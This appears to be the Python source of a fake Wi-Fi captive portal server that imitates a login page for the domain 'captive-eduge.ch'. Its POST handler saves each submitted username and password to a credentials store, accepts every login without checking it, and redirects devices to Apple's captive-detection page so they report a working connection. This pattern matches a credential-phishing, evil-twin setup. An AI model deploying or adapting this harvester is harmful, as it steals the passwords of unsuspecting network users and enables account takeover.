from http.server import SimpleHTTPRequestHandler
import socketserver
import urllib.parse
from credentials.json_save import save_credentials

PORT = 8000
CAPTIVE_PORTAL_DOMAIN = "captive-eduge.ch"

authed_ips = []

class Server(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Uncomment this line to get logs
        # print(*args)
        pass

    def get_domain(self):
        if not "Host" in self.headers:
            self.send_response(400)
            self.domain = ""
        else:
            self.domain = self.headers["Host"].split(":")[0]

    # Triggered whenever a client sends an HTTP GET request
    def do_GET(self):
        self.get_domain()
        print()
        print(f"GET request for {self.domain}{self.path}")

        ip = self.address_string()

        if ip in authed_ips:
            # TODO: Detect other CPD to support other OS
            if self.domain == "captive.apple.com" and self.path == "/hotspot-detect.html":
                self.path = f"/apple{self.path}"
                print(f"Serving {self.path} to {self.address_string()}")
                return SimpleHTTPRequestHandler.do_GET(self)

            else:
                # TODO: Hang forever instead of breaking the connection. This would need to use a threaded HTTPServer
                pass
        else:
            print("Not authed")
            if self.domain == CAPTIVE_PORTAL_DOMAIN:
                print(f"Serving {self.path} to {self.address_string()}")
                return SimpleHTTPRequestHandler.do_GET(self)
            else:
                print(f"Redirecting {self.address_string()} to http://{CAPTIVE_PORTAL_DOMAIN}")
                self.send_response(302)
                self.send_header('Location', f"http://{CAPTIVE_PORTAL_DOMAIN}")
                self.end_headers()
                return

    def do_POST(self):
        self.get_domain()
        print()
        print(f"POST request for {self.domain}{self.path}")
        if self.domain == CAPTIVE_PORTAL_DOMAIN:
            content_length = int(self.headers['Content-Length'])
            data = bytes.decode(self.rfile.read(content_length))

            query = urllib.parse.parse_qs(data)
            ip = self.address_string()

            username = query.get("username", [""])[0]
            password = query.get("password", [""])[0]

            print(f"POST from {ip} to log in with username: '{username}' and password: '{password[0:4] + (len(password) - 4)*'*'}'")
            print("Saving credentials...")

            save_credentials(username, password)
            
            # THIS IS WHERE YOU WOULD CHECK THE USER CREDENTIALS
            user_authenticated = True
            
            if user_authenticated:              
                print("AUTH valid")

                authed_ips.append(ip)

                self.send_response(302)
                self.send_header('Location', "http://captive.apple.com/hotspot-detect.html")
                self.end_headers()
                return
            else:
                print("AUTH invalid")
                self.send_response(302)
                self.send_header('Location', f"http://{CAPTIVE_PORTAL_DOMAIN}/?statusCode=4")
                self.end_headers()
                return


socketserver.TCPServer.allow_reuse_address = True
webServer = socketserver.TCPServer(("", PORT), Server)

try:
    print("Server started http://localhost:" + str(PORT))
    webServer.serve_forever()
except KeyboardInterrupt:
    webServer.server_close()
    print("\nServer stopped.")